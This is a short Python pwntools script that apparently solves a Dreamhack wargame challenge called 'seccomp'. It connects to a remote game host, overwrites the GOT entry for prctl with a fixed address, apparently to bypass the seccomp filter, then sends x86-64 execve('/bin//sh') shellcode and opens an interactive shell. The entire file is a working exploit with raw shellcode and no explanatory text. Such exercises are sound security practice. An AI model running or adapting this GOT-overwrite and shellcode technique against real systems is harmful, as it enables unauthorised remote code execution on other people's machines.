#!/usr/bin/env python3

from time import sleep
from pwn import *

context.update(os="linux", arch="amd64")

e = ELF("./seccomp")

HOST = "host1.dreamhack.games"
PORT = 16054

conn = remote(HOST, PORT)

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

conn.sendline("3")
print(conn.recv(timeout=0.5))

conn.sendline(str(e.got["prctl"]))
conn.sendline(str(0x0000000000400A4E))
conn.sendline("1")
conn.sendline(shellcode)
sleep(0.3)
conn.sendline("2")
conn.interactive()
